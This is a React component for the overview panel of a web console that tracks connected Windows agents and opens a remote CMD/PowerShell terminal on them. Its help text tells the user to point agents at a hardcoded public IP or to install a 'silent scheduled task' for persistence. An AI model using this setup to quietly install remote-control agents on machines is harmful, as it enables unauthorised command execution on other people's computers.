'use client';

import type { ConnState, ConsoleAgentRow } from '@/hooks/useConsoleSocket';

type Props = {
  conn: ConnState;
  agentReady: boolean;
  agents: ConsoleAgentRow[];
  selectedAgentId: string | null;
  accountLine: string | null;
  machineLine: string | null;
  onSelectAgent: (id: string) => void;
  onRefresh: () => void;
  onOpenTerminal: () => void;
};

export default function ConsoleOverviewPanel({
  conn,
  agentReady,
  agents,
  selectedAgentId,
  accountLine,
  machineLine,
  onSelectAgent,
  onRefresh,
  onOpenTerminal,
}: Props) {
  const onlineCount = agents.length;

  return (
    <div className="flex flex-col gap-4">
      <div className="grid grid-cols-1 gap-3 sm:grid-cols-3">
        <div className="rounded-xl border border-cyan-500/25 bg-black/40 p-4">
          <p className="text-[10px] font-semibold uppercase tracking-wider text-cyan-400/80">Portal link</p>
          <p className="mt-2 text-lg font-bold text-cyan-100">
            {conn === 'open' ? 'CONNECTED' : conn === 'connecting' ? 'CONNECTING…' : 'OFFLINE'}
          </p>
          <p className="mt-1 text-xs text-cyan-700/90">
            {conn === 'open' ? 'Socket.IO to API is live' : 'Check API :4000 and firewall'}
          </p>
        </div>
        <div className="rounded-xl border border-emerald-500/25 bg-black/40 p-4">
          <p className="text-[10px] font-semibold uppercase tracking-wider text-emerald-400/80">Windows agents</p>
          <p className="mt-2 text-lg font-bold text-emerald-100">{onlineCount}</p>
          <p className="mt-1 text-xs text-emerald-700/90">
            {onlineCount === 0
              ? 'Run agent on each PC: py src\\main.py --api http://YOUR_IP:4000'
              : agentReady
                ? 'At least one agent ready for CMD / PS / files'
                : 'Waiting for agent:register…'}
          </p>
        </div>
        <div className="rounded-xl border border-amber-500/25 bg-black/40 p-4">
          <p className="text-[10px] font-semibold uppercase tracking-wider text-amber-400/80">Selected machine</p>
          <p className="mt-2 truncate text-lg font-bold text-amber-100">
            {agents.find((a) => a.id === selectedAgentId)?.host ?? '—'}
          </p>
          <p className="mt-1 truncate text-xs text-amber-700/90">{accountLine ?? 'Session not loaded'}</p>
        </div>
      </div>

      <div className="rounded-xl border border-cyan-500/20 bg-black/35 p-4">
        <div className="mb-3 flex flex-wrap items-center justify-between gap-2">
          <h3 className="text-sm font-semibold text-cyan-100">Connected machines</h3>
          <div className="flex gap-2">
            <button type="button" className="cyber-btn cyber-btn-ghost px-3 py-1.5 text-xs" onClick={onRefresh}>
              Refresh data
            </button>
            <button type="button" className="cyber-btn px-3 py-1.5 text-xs" onClick={onOpenTerminal}>
              Open terminal
            </button>
          </div>
        </div>
        {agents.length === 0 ? (
          <p className="text-sm text-cyan-700/90">
            No agents online. On each Windows laptop run{' '}
            <code className="text-cyan-300">py src\main.py --api http://52.62.136.167:4000</code> or install the
            silent scheduled task (see agent/scripts/install-silent.ps1).
          </p>
        ) : (
          <ul className="flex flex-col gap-2">
            {agents.map((a) => {
              const active = a.id === selectedAgentId;
              return (
                <li key={a.id}>
                  <button
                    type="button"
                    onClick={() => onSelectAgent(a.id)}
                    className={`flex w-full items-center justify-between rounded-lg border px-3 py-2.5 text-left text-sm transition-all ${
                      active
                        ? 'border-emerald-500/50 bg-emerald-500/10 text-emerald-100 shadow-[0_0_16px_rgba(16,185,129,0.15)]'
                        : 'border-cyan-900/50 bg-black/30 text-cyan-200/80 hover:border-cyan-500/35'
                    }`}
                  >
                    <span className="font-mono font-medium">{a.host}</span>
                    <span className="text-[10px] uppercase tracking-wide text-emerald-400/90">
                      {active ? 'Selected' : 'Select'}
                    </span>
                  </button>
                </li>
              );
            })}
          </ul>
        )}
        {machineLine ? (
          <p className="mt-3 font-mono text-[11px] text-cyan-600/90">{machineLine}</p>
        ) : null}
      </div>
    </div>
  );
}
